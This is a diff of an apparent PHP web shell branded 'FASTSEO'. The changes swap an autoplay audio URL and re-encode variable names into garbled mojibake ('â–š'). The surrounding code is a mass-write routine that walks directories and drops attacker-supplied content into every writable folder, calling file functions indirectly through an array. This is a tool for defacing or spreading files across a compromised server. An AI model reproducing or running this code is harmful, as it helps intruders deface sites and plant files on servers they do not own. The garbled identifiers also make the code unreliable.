@@ -129,7 +129,7 @@ window.onerror = ClearError;
 </pre></font>    
  
 <br>
-<audio src="https://nathanprinsley-files.prinsh.com/data-1/mp3/jeremy-flick_anonymous.mp3" autoplay="1" loop="1"></audio>
+<audio src="https://fastseo.site/masik/sepuh.mp3" autoplay="1" loop="1"></audio>
 <h1>FASTSEO</h1>
  
  
@@ -814,17 +814,17 @@ snowStorm.useTwinkleEffect = true;
 			$dira = scandir($dir);
 			foreach($dira as $dirb) {
 				$dirc = "$dir/$dirb";
-				$▚ = $dirc.'/'.$namefile;
+				$â–š = $dirc.'/'.$namefile;
 				if($dirb === '.') {
-					$fungsi[2]($▚, $contents_sc);
+					$fungsi[2]($â–š, $contents_sc);
 				} elseif($dirb === '..') {
-					$fungsi[2]($▚, $contents_sc);
+					$fungsi[2]($â–š, $contents_sc);
 				} else {
 					if($fungsi[1]($dirc)) {
 						if(is_writable($dirc)) {
-							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
-							$fungsi[2]($▚, $contents_sc);
-							$▟ = mass_all($dirc,$namefile,$contents_sc);
+							echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$â–š<br>";
+							$fungsi[2]($â–š, $contents_sc);
+							$â–Ÿ = mass_all($dirc,$namefile,$contents_sc);
 							}
 						}
 					}
@@ -836,16 +836,16 @@ snowStorm.useTwinkleEffect = true;
 				$dira = scandir($dir);
 				foreach($dira as $dirb) {
 					$dirc = "$dir/$dirb";
-					$▚ = $dirc.'/'.$namefile;
+					$â–š = $dirc.'/'.$namefile;
 					if($dirb === '.') {
-						$fungsi[2]($▚, $contents_sc);
+						$fungsi[2]($â–š, $contents_sc);
 					} elseif($dirb === '..') {
-						$fungsi[2]($▚, $contents_sc);
+						$fungsi[2]($â–š, $contents_sc);
 					} else {
 						if($fungsi[1]($dirc)) {
 							if(is_writable($dirc)) {
 								echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namefile<br>";
-								$fungsi[2]($▚, $contents_sc);
+								$fungsi[2]($â–š, $contents_sc);
 							}
 						}
 					}
